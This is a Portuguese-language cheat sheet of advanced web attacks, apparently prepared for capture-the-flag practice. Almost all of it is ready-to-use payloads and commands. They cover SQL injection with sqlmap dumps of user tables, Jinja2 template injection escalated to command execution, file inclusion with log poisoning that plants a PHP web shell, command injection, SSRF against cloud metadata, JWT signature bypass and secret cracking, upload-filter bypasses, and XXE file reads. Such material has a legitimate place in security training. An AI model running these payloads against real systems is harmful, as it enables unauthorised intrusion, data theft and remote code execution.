# 01 — WEB AVANÇADO

> Explorações de verdade: do `' OR 1=1` até RCE. Coringa: `bash scripts/web_recon.sh URL`.

---

## SQL INJECTION — além do básico

```sql
-- UNION (extrair dados de outras tabelas): primeiro descubra o nº de colunas
' ORDER BY 1-- -      ' ORDER BY 2-- -   ...até dar erro
' UNION SELECT 1,2,3-- -                 (ajuste a qtde de colunas)
' UNION SELECT username,password,3 FROM users-- -

-- Listar tabelas e colunas (MySQL):
' UNION SELECT table_name,2,3 FROM information_schema.tables-- -
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -

-- Blind booleano (quando não mostra dado, só muda a resposta):
' AND 1=1-- -   (página normal)   vs   ' AND 1=2-- -   (página diferente)

-- Blind por tempo (quando nem isso muda):
' AND SLEEP(5)-- -        (se demorar 5s, é vulnerável)
```

**Automatize com sqlmap** (deixa ele fazer o trabalho sujo):
```bash
sqlmap -u "http://alvo/item?id=1" --batch --dbs          # lista bancos
sqlmap -u "http://alvo/item?id=1" --batch -D loja --tables
sqlmap -u "http://alvo/item?id=1" --batch -D loja -T users --dump
# login via POST:
sqlmap -u "http://alvo/login" --data="user=a&pass=b" --batch --dump
```

---

## SSTI → RCE (você já viu o {{7*7}}; agora escala)

Confirmou que `{{7*7}}` vira `49`? É Jinja2 (Python). Escale:
```python
# Ler arquivos:
{{ get_flashed_messages.__globals__.__builtins__.open('/flag.txt').read() }}
# Executar comando (RCE):
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('ls /').read() }}
```
Outros motores: `${7*7}` (Java/Spring), `<%= 7*7 %>` (Ruby/ERB), `#{7*7}` (Ruby).

---

## LFI → RCE (ler/executar via inclusão de arquivo)

```bash
# Vazar o código-fonte PHP em base64 (não executa, só mostra):
http://alvo/?page=php://filter/convert.base64-encode/resource=index.php
# Ler arquivos do sistema:
http://alvo/?page=../../../../etc/passwd
# Filtro bloqueia ../ ? tente null byte / encode:
%2e%2e%2f   ....//   ..%2f
# RCE via log poisoning: injete <?php system($_GET['c']); ?> no User-Agent,
# depois inclua o log: ?page=/var/log/apache2/access.log&c=id
```

---

## COMMAND INJECTION (campo que executa comando do sistema)

```bash
; ls
| ls
`id`
$(whoami)
127.0.0.1; cat /flag.txt     # em campos tipo "ping um IP"
```

---

## SSRF (fazer o servidor acessar coisas internas)

```
http://alvo/?url=http://127.0.0.1:8080/admin     # portas internas
http://alvo/?url=http://169.254.169.254/latest/meta-data/   # metadados de nuvem (AWS)
http://alvo/?url=file:///etc/passwd
```

---

## JWT (aquele token com 3 partes separadas por ponto)

```bash
# Decodifique em jwt.io ou:
echo "PARTE_DO_MEIO" | base64 -d

# Ataque "alg:none" (remover a assinatura) — use jwt_tool:
python3 jwt_tool.py <TOKEN> -X a          # força alg=none
# Quebrar o segredo fraco por força bruta:
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
# Depois forje um token com admin=true e a role que quiser.
```

---

## UPLOAD malicioso (burlar filtro de upload)

- Renomeie: `shell.php.jpg`, `shell.pHp`, `shell.phtml`
- Forje o magic byte: comece o arquivo com `GIF89a` e cole o PHP depois.
- Suba um `.htaccess` que faça o servidor tratar `.jpg` como PHP.

---

## XXE (injeção em XML)

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<root><data>&x;</data></root>
```

---

## FERRAMENTAS PESADAS

```bash
# Descobrir caminhos escondidos (mais fundo que o básico)
ffuf -u http://alvo/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
gobuster dir -u http://alvo -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak

# Descobrir subdomínios/vhosts
ffuf -u http://alvo -H "Host: FUZZ.alvo" -w wordlist.txt
```
**Burp Suite** segue sendo o canivete: Repeater pra refazer requisições mudando valores,
Intruder pra força bruta, Decoder pra base64/url.
